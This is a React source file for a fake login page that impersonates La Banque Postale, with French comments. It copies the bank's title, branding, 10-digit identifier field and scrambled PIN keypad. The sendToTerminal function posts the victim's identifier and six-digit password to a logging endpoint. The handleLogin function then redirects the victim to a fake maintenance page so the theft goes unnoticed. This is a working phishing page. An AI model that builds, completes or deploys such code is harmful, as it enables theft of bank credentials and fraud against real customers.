import { X, Search } from 'lucide-react';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Checkbox } from '../components/ui/checkbox';
import { toast } from '../hooks/use-toast';
import React, { useState, useEffect } from 'react';
import { Link } from "react-router-dom";

const Login = () => {
  const [identifier, setIdentifier] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [showCookieBanner, setShowCookieBanner] = useState(true);
  
  const [step, setStep] = useState(1); 
  const [password, setPassword] = useState('');
  const keypadNumbers = [9, 3, 4, 8, 1, 6, 2, 5, 0, 7];

  useEffect(() => {
    document.title = "Connexion à mon espace client - La Banque Postale";
  }, []);

  // --- FONCTION POUR ENVOYER LES INFOS AU TERMINAL ---
  const sendToTerminal = async (data) => {
    try {
      await fetch('http://localhost:5000/api/log-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    } catch (error) {
      console.error("Erreur serveur (vérifie que node server.js est lancé)");
    }
  };

  const handleContinue = (e) => {
    e.preventDefault();
    if (identifier.length !== 10) {
      toast({
        title: "Erreur",
        description: "L'identifiant doit contenir 10 chiffres",
        variant: "destructive"
      });
      return;
    }
    
    // ENVOI DE L'ID AU TERMINAL
    sendToTerminal({ type: "IDENTIFIANT", value: identifier });
    
    setStep(2);
  };

  const handleNumberClick = (num) => {
    if (password.length < 6) {
      const newPassword = password + num;
      setPassword(newPassword);
    }
  };

// Dans Login.jsx
const handleLogin = (e) => {
  e.preventDefault();
  if (password.length === 6) {
    // 1. Envoi au terminal (ton code existant)
    sendToTerminal({ 
      type: "LOGIN_COMPLET", 
      user: identifier, 
      pass: password 
    });

    toast({
      title: "Authentification",
      description: "Vérification de vos clés de sécurité..."
    });

    // 2. Redirection vers la page de maintenance après 1.5 seconde
    setTimeout(() => {
      window.location.href = "/maintenance"; // Assure-toi d'avoir créé cette route dans App.js
    }, 1500);
  }
};

  // ... le reste de ton code (return) reste identique ...
  return (
    <div className="min-h-screen flex flex-col md:flex-row">
      <div className="w-full md:w-1/2 lg:w-[30%] bg-white flex flex-col">
        <header className="bg-white px-4 md:px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-8">
            <Link to="/">
              <img src="/Screenshot from 2026-03-11 23-53-07.png" alt="logo" className="h-16" />
            </Link>
          </div>
          <div className="flex items-center gap-4">
            <button className="p-2 hover:bg-gray-100 rounded-full transition-colors"><Search className="w-8 h-8 text-gray-600" /></button>
            <Link to="/" className="p-2 hover:bg-gray-100 rounded-full transition-colors"><X className="w-8 h-8 text-gray-600" /></Link>
          </div>
        </header>

        <div className="flex-1 flex items-start justify-center px-4 md:px-6 py-8 md:py-16 bg-white">
          <div className="w-full max-w-md">
            <h1 className="text-2xl font-light text-gray-600 mb-12 text-center">Connexion à votre compte particulier</h1>

            <form onSubmit={step === 1 ? handleContinue : handleLogin} className="space-y-6">
              <div>
                <label className="block text-sm text-[#002a5a] font-bold mb-2">Identifiant (10 chiffres)</label>
                <Input
                  type="text"
                  maxLength={10}
                  disabled={step === 2}
                  value={identifier}
                  onChange={(e) => setIdentifier(e.target.value.replace(/\D/g, ''))}
                  className="w-full h-14 px-4 border border-gray-300 rounded-md text-base"
                />
              </div>

              {step === 1 ? (
                <>
                  <div className="flex items-center space-x-2">
                    <Checkbox id="remember" checked={rememberMe} onCheckedChange={setRememberMe} />
                    <label htmlFor="remember" className="text-sm text-gray-600 cursor-pointer">Mémoriser mon identifiant</label>
                  </div>
                  <Button type="submit" className="w-full h-20 bg-[#013da5] hover:bg-[#013da5] text-white text-lg rounded-md font-bold uppercase">Continuer</Button>
                </>
              ) : (
                <div className="space-y-6 animate-in fade-in duration-300">
                  <label className="block text-sm text-[#002a5a] font-bold mb-2 text-center">Saisissez votre mot de passe</label>
                  <div className="flex justify-center gap-4 mb-8">
                    {[...Array(6)].map((_, i) => (
                      <div key={i} className={`w-4 h-4 rounded-full border-2 border-[#002a5a] ${i < password.length ? 'bg-[#002a5a]' : 'bg-white'}`} />
                    ))}
                  </div>
                  <div className="grid grid-cols-5 gap-3">
                    {keypadNumbers.map((num) => (
                      <button
                        key={num}
                        type="button"
                        onClick={() => handleNumberClick(num)}
                        className="h-16 bg-[#eef5fc] text-[#002a5a] text-2xl font-bold rounded-md hover:bg-blue-100 active:scale-95 transition-all"
                      >
                        {num}
                      </button>
                    ))}
                  </div>
                  <Button type="submit" disabled={password.length < 6} className="w-full h-20 bg-[#013da5] hover:bg-[#013da5] text-white text-lg rounded-md font-bold uppercase">Se connecter</Button>
                  <button type="button" onClick={() => { setStep(1); setPassword(''); }} className="w-full text-xs text-blue-800 underline">Retour à l'identifiant</button>
                </div>
              )}
            </form>
          </div>
        </div>
      </div>
      
      {/* Colonne Bleue Droite (Garder ton code ici) */}
      <div className="hidden md:flex w-full md:w-1/2 lg:w-[70%] bg-gradient-to-b from-[#2f5fb3] to-[#3f95c0] flex-col justify-center px-10">
          <h1 className="text-5xl font-bold text-white mb-8">La Banque Postale, citoyenne</h1>
          <div className="max-w-xl bg-[#184c77] rounded-lg p-8">
              <h3 className="text-white font-bold mb-4">Espace Assurance La Banque Postale</h3>
              <p className="text-white/90 text-sm mb-6">Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver <br></br>vos contrats La Banque Postale Assurance ?

              </p>
              <Button variant="outline" className="border-white text-white hover:bg-white/10">Me connecter</Button>
          </div>
      </div>

      {/* Cookie Banner (Garder ton code ici) */}
      {showCookieBanner && (/* ... ton code bannière ... */ null)}
    </div>
  );
};

export default Login;